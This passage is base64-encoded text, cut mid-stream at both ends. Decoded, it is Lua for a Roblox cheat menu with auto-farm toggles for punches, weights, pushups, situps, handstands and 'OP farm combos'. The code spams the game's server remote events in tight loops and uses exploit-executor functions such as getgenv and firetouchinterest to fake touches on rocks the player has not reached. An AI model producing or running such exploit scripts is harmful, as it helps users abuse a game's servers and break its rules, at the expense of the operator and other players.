CAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXINCiAgICAgICAgbG9jYWwgcHVuY2ggPSBjaGFyYWN0ZXIgYW5kIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKQ0KICAgICAgICBpZiBwdW5jaCBhbmQgcHVuY2g6RmluZEZpcnN0Q2hpbGQoImF0dGFja1RpbWUiKSB0aGVuDQogICAgICAgICAgICBwdW5jaC5hdHRhY2tUaW1lLlZhbHVlID0gMA0KICAgICAgICBlbmQNCg0KICAgICAgICBwbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicHVuY2giLCAibGVmdEhhbmQiKQ0KICAgICAgICBwbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicHVuY2giLCAicmlnaHRIYW5kIikNCiAgICAgICAgdGFzay53YWl0KDAuMDAxKQ0KICAgIGVuZA0KDQogICAgbG9jYWwgcHVuY2ggPSBwbGF5ZXIuQ2hhcmFjdGVyIGFuZCBwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpDQogICAgaWYgcHVuY2ggYW5kIHB1bmNoOkZpbmRGaXJzdENoaWxkKCJhdHRhY2tUaW1lIikgdGhlbg0KICAgICAgICBwdW5jaC5hdHRhY2tUaW1lLlZhbHVlID0gMC4zNQ0KICAgIGVuZA0KDQogICAgaWYgcGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKSB0aGVuDQogICAgICAgIHBsYXllci5DaGFyYWN0ZXIuUHVuY2guUGFyZW50ID0gcGxheWVyLkJhY2twYWNrDQogICAgZW5kDQplbmQNCg0KQXV0b0Zhcm06VG9nZ2xlKHsNCiAgICBUaXRsZSA9ICJGYXN0IFB1bmNoIiwNCiAgICBEZXNjID0gIlJhcGlkIHB1bmNoIGF1dG9tYXRpb24iLA0KICAgIFZhbHVlID0gZmFsc2UsDQogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkNCiAgICAgICAgX0cuZmFzdFB1bmNoID0gc3RhdGUNCiAgICAgICAgaWYgc3RhdGUgdGhlbg0KICAgICAgICAgICAgYXV0b0Zhc3RQdW5jaCgpDQogICAgICAgIGVuZA0KICAgIGVuZA0KfSkNCg0KLS0gQXV0byBQdW5jaA0KbG9jYWwgZnVuY3Rpb24gYXV0b1B1bmNoKCkNCiAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXINCiAgICBsb2NhbCBwbGF5ZXJOYW1lID0gcGxheWVyLk5hbWUNCiAgICBfRy5wdW5jaGFuaW0gPSB0cnVlDQoNCiAgICBnYW1lOkdldFNlcnZpY2UoIlJ1blNlcnZpY2UiKS5IZWFydGJlYXQ6Q29ubmVjdChmdW5jdGlvbigpICANCiAgICAgICAgaWYgX0cucHVuY2hhbmltIHRoZW4gIA0KICAgICAgICAgICAgbG9jYWwgcHVuY2hUb29sID0gIA0KICAgICAgICAgICAgICAgIHBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKSBvciAgDQogICAgICAgICAgICAgICAgZ2FtZS5Xb3Jrc3BhY2U6RmluZEZpcnN0Q2hpbGQocGxheWVyTmFtZSkgYW5kIGdhbWUuV29ya3NwYWNlOkZpbmRGaXJzdENoaWxkKHBsYXllck5hbWUpOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpICANCg0KICAgICAgICAgICAgaWYgcHVuY2hUb29sIHRoZW4gIA0KICAgICAgICAgICAgICAgIGlmIHB1bmNoVG9vbC5QYXJlbnQgfj0gZ2FtZS5Xb3Jrc3BhY2U6RmluZEZpcnN0Q2hpbGQocGxheWVyTmFtZSkgdGhlbiAgDQogICAgICAgICAgICAgICAgICAgIHB1bmNoVG9vbC5QYXJlbnQgPSBnYW1lLldvcmtzcGFjZTpGaW5kRmlyc3RDaGlsZChwbGF5ZXJOYW1lKQ0KICAgICAgICAgICAgICAgIGVuZCAgDQogICAgICAgICAgICAgICAgcHVuY2hUb29sOkFjdGl2YXRlKCkNCiAgICAgICAgICAgIGVsc2UgIA0KICAgICAgICAgICAgICAgIHdhcm4oIlB1bmNoIHRvb2wgbm90IGZvdW5kIikgIA0KICAgICAgICAgICAgICAgIF9HLnB1bmNoYW5pbSA9IGZhbHNlDQogICAgICAgICAgICBlbmQgIA0KICAgICAgICBlbmQgIA0KICAgIGVuZCkNCmVuZA0KDQpBdXRvRmFybTpUb2dnbGUoew0KICAgIFRpdGxlID0gIkF1dG8gUHVuY2giLA0KICAgIERlc2MgPSAiQXV0b21hdGljIHB1bmNoIHRvb2wgYWN0aXZhdGlvbiIsDQogICAgVmFsdWUgPSBmYWxzZSwNCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQ0KICAgICAgICBfRy5wdW5jaGFuaW0gPSBzdGF0ZQ0KICAgICAgICBpZiBzdGF0ZSB0aGVuDQogICAgICAgICAgICBhdXRvUHVuY2goKQ0KICAgICAgICBlbmQNCiAgICBlbmQNCn0pDQoNCi0tIEluZGl2aWR1YWwgRXhlcmNpc2UgVG9nZ2xlcw0KbG9jYWwgZnVuY3Rpb24gYXV0b011c2NsZShhY3Rpb24pDQogICAgbG9jYWwgcGxheWVyID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXINCiAgICB3aGlsZSBfR1thY3Rpb25dIGRvDQogICAgICAgIGxvY2FsIHRvb2wgPSBwbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoYWN0aW9uKSANCiAgICAgICAgaWYgdG9vbCB0aGVuDQogICAgICAgICAgICB0b29sLlBhcmVudCA9IHBsYXllci5DaGFyYWN0ZXINCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpDQogICAgICAgICAgICB0b29sOkFjdGl2YXRlKCkNCiAgICAgICAgZW5kDQogICAgICAgIHBsYXllci5tdXNjbGVFdmVudDpGaXJlU2VydmVyKCJyZXAiLCBhY3Rpb24pDQogICAgICAgIHRhc2sud2FpdCgpDQogICAgZW5kDQoNCiAgICBpZiBwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKGFjdGlvbikgdGhlbg0KICAgICAgICBwbGF5ZXIuQ2hhcmFjdGVyW2FjdGlvbl0uUGFyZW50ID0gcGxheWVyLkJhY2twYWNrDQogICAgZW5kDQplbmQNCg0KQXV0b0Zhcm06VG9nZ2xlKHsNCiAgICBUaXRsZSA9ICJBdXRvIFdlaWdodCIsDQogICAgRGVzYyA9ICJBdXRvbWF0aWMgd2VpZ2h0IHRyYWluaW5nIiwNCiAgICBWYWx1ZSA9IGZhbHNlLA0KICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpDQogICAgICAgIF9HWyJXZWlnaHQiXSA9IHN0YXRlDQogICAgICAgIGlmIHN0YXRlIHRoZW4gDQogICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkgYXV0b011c2NsZSgiV2VpZ2h0IikgZW5kKSANCiAgICAgICAgZW5kDQogICAgZW5kDQp9KQ0KDQpBdXRvRmFybTpUb2dnbGUoew0KICAgIFRpdGxlID0gIkF1dG8gUHVzaHVwcyIsDQogICAgRGVzYyA9ICJBdXRvbWF0aWMgcHVzaHVwcyIsDQogICAgVmFsdWUgPSBmYWxzZSwNCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQ0KICAgICAgICBfR1siUHVzaHVwcyJdID0gc3RhdGUNCiAgICAgICAgaWYgc3RhdGUgdGhlbiANCiAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKSBhdXRvTXVzY2xlKCJQdXNodXBzIikgZW5kKSANCiAgICAgICAgZW5kDQogICAgZW5kDQp9KQ0KDQpBdXRvRmFybTpUb2dnbGUoew0KICAgIFRpdGxlID0gIkF1dG8gSGFuZHN0YW5kcyIsDQogICAgRGVzYyA9ICJBdXRvbWF0aWMgaGFuZHN0YW5kcyIsDQogICAgVmFsdWUgPSBmYWxzZSwNCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQ0KICAgICAgICBfR1siSGFuZHN0YW5kcyJdID0gc3RhdGUNCiAgICAgICAgaWYgc3RhdGUgdGhlbiANCiAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKSBhdXRvTXVzY2xlKCJIYW5kc3RhbmRzIikgZW5kKSANCiAgICAgICAgZW5kDQogICAgZW5kDQp9KQ0KDQpBdXRvRmFybTpUb2dnbGUoew0KICAgIFRpdGxlID0gIkF1dG8gU2l0dXBzIiwNCiAgICBEZXNjID0gIkF1dG9tYXRpYyBzaXR1cHMiLA0KICAgIFZhbHVlID0gZmFsc2UsDQogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkNCiAgICAgICAgX0dbIlNpdHVwcyJdID0gc3RhdGUNCiAgICAgICAgaWYgc3RhdGUgdGhlbiANCiAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKSBhdXRvTXVzY2xlKCJTaXR1cHMiKSBlbmQpIA0KICAgICAgICBlbmQNCiAgICBlbmQNCn0pDQoNCi0tIE9QIEZhcm0gQ29tYm9zIFNlY3Rpb24NCkF1dG9GYXJtOlNlY3Rpb24oe1RpdGxlID0gIk9QIEZBUk0gQ09NQk9TIn0pDQoNCi0tIFB1c2h1cHMgKyBKdW5nbGUgUm9jayBDb21ibw0KQXV0b0Zhcm06VG9nZ2xlKHsNCiAgICBUaXRsZSA9ICJQdXNodXBzICsgSnVuZ2xlIFJvY2siLA0KICAgIERlc2MgPSAiQXV0byBQdXNodXBzLCBKdW5nbGUgUm9jayAmIEF1dG8gUHVuY2giLA0KICAgIFZhbHVlID0gZmFsc2UsDQogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkNCiAgICAgICAgZ2V0Z2VudigpLmF1dG9GYXJtID0gc3RhdGUNCiAgICAgICAgX0cuQXV0b1B1c2h1cHMgPSBzdGF0ZQ0KICAgICAgICBhdXRvUHVuY2hOb0FuaW0gPSBzdGF0ZQ0KICAgICAgICBzZWxlY3Ryb2NrID0gIkFuY2llbnQgSnVuZ2xlIFJvY2siDQoNCiAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpDQogICAgICAgICAgICB3aGlsZSBnZXRnZW52KCkuYXV0b0Zhcm0gZG8NCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4wMSkNCiAgICAgICAgICAgICAgICBpZiBub3QgZ2V0Z2VudigpLmF1dG9GYXJtIHRoZW4gYnJlYWsgZW5kDQoNCiAgICAgICAgICAgICAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXINCiAgICAgICAgICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyDQogICAgICAgICAgICAgICAgaWYgbm90IGNoYXJhY3RlciB0aGVuIGNvbnRpbnVlIGVuZA0KDQogICAgICAgICAgICAgICAgaWYgX0cuQXV0b1B1c2h1cHMgdGhlbg0KICAgICAgICAgICAgICAgICAgICBsb2NhbCBwdXNodXBzVG9vbCA9IHBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiUHVzaHVwcyIpIG9yIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUHVzaHVwcyIpDQogICAgICAgICAgICAgICAgICAgIGlmIHB1c2h1cHNUb29sIHRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgIGNoYXJhY3Rlci5IdW1hbm9pZDpFcXVpcFRvb2wocHVzaHVwc1Rvb2wpDQogICAgICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpDQogICAgICAgICAgICAgICAgICAgICAgICBwbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicmVwIikNCiAgICAgICAgICAgICAgICAgICAgZW5kKQ0KICAgICAgICAgICAgICAgIGVuZA0KDQogICAgICAgICAgICAgICAgaWYgYXV0b1B1bmNoTm9BbmltIHRoZW4NCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgcHVuY2hUb29sID0gcGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpIG9yIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKQ0KICAgICAgICAgICAgICAgICAgICBpZiBwdW5jaFRvb2wgdGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgcHVuY2hUb29sLlBhcmVudCB+PSBjaGFyYWN0ZXIgdGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB1bmNoVG9vbC5QYXJlbnQgPSBjaGFyYWN0ZXINCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBsYXllci5tdXNjbGVFdmVudDpGaXJlU2VydmVyKCJwdW5jaCIsICJyaWdodEhhbmQiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBsYXllci5tdXNjbGVFdmVudDpGaXJlU2VydmVyKCJwdW5jaCIsICJsZWZ0SGFuZCIpDQogICAgICAgICAgICAgICAgICAgICAgICBlbmQpDQogICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIHdhcm4oIlB1bmNoIHRvb2wgbm90IGZvdW5kIikNCiAgICAgICAgICAgICAgICAgICAgICAgIGF1dG9QdW5jaE5vQW5pbSA9IGZhbHNlDQogICAgICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgIGVuZA0KDQogICAgICAgICAgICAgICAgaWYgcGxheWVyOkZpbmRGaXJzdENoaWxkKCJEdXJhYmlsaXR5IikgYW5kIHBsYXllci5EdXJhYmlsaXR5LlZhbHVlID49IDEwMDAwMDAwIHRoZW4NCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHYgaW4gcGFpcnMoZ2FtZS5Xb3Jrc3BhY2UubWFjaGluZXNGb2xkZXI6R2V0RGVzY2VuZGFudHMoKSkgZG8NCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHYuTmFtZSA9PSAibmVlZGVkRHVyYWJpbGl0eSIgYW5kIHYuVmFsdWUgPT0gMTAwMDAwMDAgYW5kIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiTGVmdEhhbmQiKSBhbmQgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJSaWdodEhhbmQiKSB0aGVuDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgY2hhcmFjdGVyLlJpZ2h0SGFuZCwgMCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBjaGFyYWN0ZXIuUmlnaHRIYW5kLCAxKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGNoYXJhY3Rlci5MZWZ0SGFuZCwgMCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBjaGFyYWN0ZXIuTGVmdEhhbmQsIDEpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZ2V0dG9vbCB0aGVuIHBjYWxsKGdldHRvb2wpIGVuZA0KICAgICAgICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgZW5kDQogICAgICAgIGVuZCkNCiAgICBlbmQNCn0pDQoNCi0tIFNpdHVwcyArIEp1bmdsZSBSb2NrIENvbWJvDQpBdXRvRmFybTpUb2dnbGUoew0KICAgIFRpdGxlID0gIlNpdHVwcyArIEp1bmdsZSBSb2NrIiwNCiAgICBEZXNjID0gIkF1dG8gU2l0dXBzLCBKdW5nbGUgUm9jayAmIEF1dG8gUHVuY2giLA0KICAgIFZhbHVlID0gZmFsc2UsDQogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkNCiAgICAgICAgZ2V0Z2VudigpLmF1dG9GYXJtID0gc3RhdGUNCiAgICAgICAgX0cuQXV0b1NpdHVwcyA9IHN0YXRlDQogICAgICAgIGF1dG9QdW5jaE5vQW5pbSA9IHN0YXRlDQogICAgICAgIHNlbGVjdHJvY2sgPSAiQW5jaWVudCBKdW5nbGUgUm9jayINCg0KICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkNCiAgICAgICAgICAgIHdoaWxlIGdldGdlbnYoKS5hdXRvRmFybSBkbw0KICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjAxKQ0KICAgICAgICAgICAgICAgIGlmIG5vdCBnZXRnZW52KCkuYXV0b0Zhcm0gdGhlbiBicmVhayBlbmQNCg0KICAgICAgICAgICAgICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcg0KICAgICAgICAgICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXINCiAgICAgICAgICAgICAgICBpZiBub3QgY2hhcmFjdGVyIHRoZW4gY29udGludWUgZW5kDQoNCiAgICAgICAgICAgICAgICBpZiBfRy5BdXRvU2l0dXBzIHRoZW4NCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgc2l0dXBzVG9vbCA9IHBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiU2l0dXBzIikgb3IgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJTaXR1cHMiKQ0KICAgICAgICAgICAgICAgICAgICBpZiBzaXR1cHNUb29sIHRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgIGNoYXJhY3Rlci5IdW1hbm9pZDpFcXVpcFRvb2woc2l0dXBzVG9vbCkNCiAgICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkNCiAgICAgICAgICAgICAgICAgICAgICAgIHBsYXllci5tdXNjbGVFdmVudDpGaXJlU2VydmVyKCJyZXAiKQ0KICAgICAgICAgICAgICAgICAgICBlbmQpDQogICAgICAgICAgICAgICAgZW5kDQoNCiAgICAgICAgICAgICAgICBpZiBhdXRvUHVuY2hOb0FuaW0gdGhlbg0KICAgICAgICAgICAgICAgICAgICBsb2NhbCBwdW5jaFRvb2wgPSBwbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikgb3IgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpDQogICAgICAgICAgICAgICAgICAgIGlmIHB1bmNoVG9vbCB0aGVuDQogICAgICAgICAgICAgICAgICAgICAgICBpZiBwdW5jaFRvb2wuUGFyZW50IH49IGNoYXJhY3RlciB0aGVuDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHVuY2hUb29sLlBhcmVudCA9IGNoYXJhY3Rlcg0KICAgICAgICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInB1bmNoIiwgInJpZ2h0SGFuZCIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInB1bmNoIiwgImxlZnRIYW5kIikNCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkNCiAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgd2FybigiUHVuY2ggdG9vbCBub3QgZm91bmQiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgYXV0b1B1bmNoTm9BbmltID0gZmFsc2UNCiAgICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgZW5kDQoNCiAgICAgICAgICAgICAgICBpZiBwbGF5ZXI6RmluZEZpcnN0Q2hpbGQoIkR1cmFiaWxpdHkiKSBhbmQgcGxheWVyLkR1cmFiaWxpdHkuVmFsdWUgPj0gMTAwMDAwMDAgdGhlbg0KICAgICAgICAgICAgICAgICAgICBmb3IgXywgdiBpbiBwYWlycyhnYW1lLldvcmtzcGFjZS5tYWNoaW5lc0ZvbGRlcjpHZXREZXNjZW5kYW50cygpKSBkbw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgdi5OYW1lID09ICJuZWVkZWREdXJhYmlsaXR5IiBhbmQgdi5WYWx1ZSA9PSAxMDAwMDAwMCBhbmQgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJMZWZ0SGFuZCIpIGFuZCBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlJpZ2h0SGFuZCIpIHRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBjaGFyYWN0ZXIuUmlnaHRIYW5kLCAwKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGNoYXJhY3Rlci5SaWdodEhhbmQsIDEpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgY2hhcmFjdGVyLkxlZnRIYW5kLCAwKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGNoYXJhY3Rlci5MZWZ0SGFuZCwgMSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBnZXR0b29sIHRoZW4gcGNhbGwoZ2V0dG9vbCkgZW5kDQogICAgICAgICAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICBlbmQNCiAgICAgICAgZW5kKQ0KICAgIGVuZA0KfSkNCg0KLS0gSGFuZHN0YW5kcyArIEp1bmdsZSBSb2NrIENvbWJvDQpBdXRvRmFybTpUb2dnbGUoew0KICAgIFRpdGxlID0gIkhhbmRzdGFuZHMgKyBKdW5nbGUgUm9jayIsDQogICAgRGVzYyA9ICJBdXRvIEhhbmRzdGFuZHMsIEp1bmdsZSBSb2NrICYgQXV0byBQdW5jaCIsDQogICAgVmFsdWUgPSBmYWxzZSwNCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQ0KICAgICAgICBnZXRnZW52KCkuYXV0b0Zhcm0gPSBzdGF0ZQ0KICAgICAgICBfRy5BdXRvSGFuZHN0YW5kcyA9IHN0YXRlDQogICAgICAgIGF1dG9QdW5jaE5vQW5pbSA9IHN0YXRlDQogICAgICAgIHNlbGVjdHJvY2sgPSAiQW5jaWVudCBKdW5nbGUgUm9jayINCg0KICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkNCiAgICAgICAgICAgIHdoaWxlIGdldGdlbnYoKS5hdXRvRmFybSBkbw0KICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjAxKQ0KICAgICAgICAgICAgICAgIGlmIG5vdCBnZXRnZW52KCkuYXV0b0Zhcm0gdGhlbiBicmVhayBlbmQNCg0KICAgICAgICAgICAgICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcg0KICAgICAgICAgICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXINCiAgICAgICAgICAgICAgICBpZiBub3QgY2hhcmFjdGVyIHRoZW4gY29udGludWUgZW5kDQoNCiAgICAgICAgICAgICAgICBpZiBfRy5BdXRvSGFuZHN0YW5kcyB0aGVuDQogICAgICAgICAgICAgICAgICAgIGxvY2FsIGhhbmRzdGFuZHNUb29sID0gcGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJIYW5kc3RhbmRzIikgb3IgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIYW5kc3RhbmRzIikNCiAgICAgICAgICAgICAgICAgICAgaWYgaGFuZHN0YW5kc1Rvb2wgdGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgY2hhcmFjdGVyLkh1bWFub2lkOkVxdWlwVG9vbChoYW5kc3RhbmRzVG9vbCkNCiAgICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkNCiAgICAgICAgICAgICAgICAgICAgICAgIHBsYXllci5tdXNjbGVFdmVudDpGaXJlU2VydmVyKCJyZXAiKQ0KICAgICAgICAgICAgICAgICAgICBlbmQpDQogICAgICAgICAgICAgICAgZW5kDQoNCiAgICAgICAgICAgICAgICBpZiBhdXRvUHVuY2hOb0FuaW0gdGhlbg0KICAgICAgICAgICAgICAgICAgICBsb2NhbCBwdW5jaFRvb2wgPSBwbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikgb3IgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJQdW5jaCIpDQogICAgICAgICAgICAgICAgICAgIGlmIHB1bmNoVG9vbCB0aGVuDQogICAgICAgICAgICAgICAgICAgICAgICBpZiBwdW5jaFRvb2wuUGFyZW50IH49IGNoYXJhY3RlciB0aGVuDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHVuY2hUb29sLlBhcmVudCA9IGNoYXJhY3Rlcg0KICAgICAgICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInB1bmNoIiwgInJpZ2h0SGFuZCIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInB1bmNoIiwgImxlZnRIYW5kIikNCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkNCiAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgd2FybigiUHVuY2ggdG9vbCBub3QgZm91bmQiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgYXV0b1B1bmNoTm9BbmltID0gZmFsc2UNCiAgICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgZW5kDQoNCiAgICAgICAgICAgICAgICBpZiBwbGF5ZXI6RmluZEZpcnN0Q2hpbGQoIkR1cmFiaWxpdHkiKSBhbmQgcGxheWVyLkR1cmFiaWxpdHkuVmFsdWUgPj0gMTAwMDAwMDAgdGhlbg0KICAgICAgICAgICAgICAgICAgICBmb3IgXywgdiBpbiBwYWlycyhnYW1lLldvcmtzcGFjZS5tYWNoaW5lc0ZvbGRlcjpHZXREZXNjZW5kYW50cygpKSBkbw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgdi5OYW1lID09ICJuZWVkZWREdXJhYmlsaXR5IiBhbmQgdi5WYWx1ZSA9PSAxMDAwMDAwMCBhbmQgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJMZWZ0SGFuZCIpIGFuZCBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlJpZ2h0SGFuZCIpIHRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdCh2LlBhcmVudC5Sb2NrLCBjaGFyYWN0ZXIuUmlnaHRIYW5kLCAwKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGNoYXJhY3Rlci5SaWdodEhhbmQsIDEpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXRvdWNoaW50ZXJlc3Qodi5QYXJlbnQuUm9jaywgY2hhcmFjdGVyLkxlZnRIYW5kLCAwKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHYuUGFyZW50LlJvY2ssIGNoYXJhY3Rlci5MZWZ0SGFuZCwgMSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBnZXR0b29sIHRoZW4gcGNhbGwoZ2V0dG9vbCkgZW5kDQogICAgICAgICAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICBlbmQNCiAgICAgICAgZW5kKQ0KICAgIGVuZA0KfSkgICAgICAgIA0KICAgICAgICANCi0tIFJlYmlydGggVGFiDQpsb2NhbCBSZWJpcnRoVGFiID0gV2luZG93OlRhYih7VGl0bGUgPSAiUmViaXJ0aCIsIEljb24gPSAicm90YXRlLWN3In0pDQoNCi0tIFRhcmdldCBSZWJpcnRoIFNlY3Rpb24NClJlYmlydGhUYWI6U2VjdGlvbih7VGl0bGUgPSAiVGFyZ2V0IFJlYmlydGgifSkNCg0KDQotLSBSb2NrIFRhYg0KbG9jYWwgUm9ja